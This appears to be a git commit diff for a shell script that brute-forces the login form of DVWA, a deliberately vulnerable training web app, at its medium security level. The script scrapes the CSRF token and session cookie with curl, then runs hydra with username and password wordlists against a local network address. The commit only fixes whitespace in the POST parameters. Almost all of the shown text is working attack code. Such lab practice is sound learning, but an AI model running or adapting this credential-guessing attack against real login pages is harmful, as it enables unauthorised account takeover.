a57d494087415ffecd7abec6f24d5324460488c2
C0nsultant <anokfireball@posteo.de>
2016-03-09 20:18:56 +0100

    Brutforceing login form - medium: removed logic-breaking whitespace

--- 1_login/2_login_medium.sh
+++ 1_login/2_login_medium.sh
@@ -15,5 +15,5 @@ curl -s -i -L -b dvwa.cookie.medium 192.168.178.98/dvwa/vulnerabilities/brute/ >
 CSRFMED=$(cat vuln | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
 SESSIONIDMED=$(grep PHPSESSID dvwa.cookie.medium | awk -F ' ' '{print $7}')
 rm hydra.restore
-hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&p     assword=^PASS^&Login=Login&user_token=${CSRFMED}:F=Content-Length\: 4945:H=Cookie\: security=medium; PHPSESSID=${SESSIONIDMED}"
+hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -d -u -F -w 10 -W 1 -V 192.168.178.98 http-post-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=${CSRFMED}:F=Content-Length\: 4945:H=Cookie\: security=medium; PHPSESSID=${SESSIONIDMED}"
 cat dvwa.cookie.medium
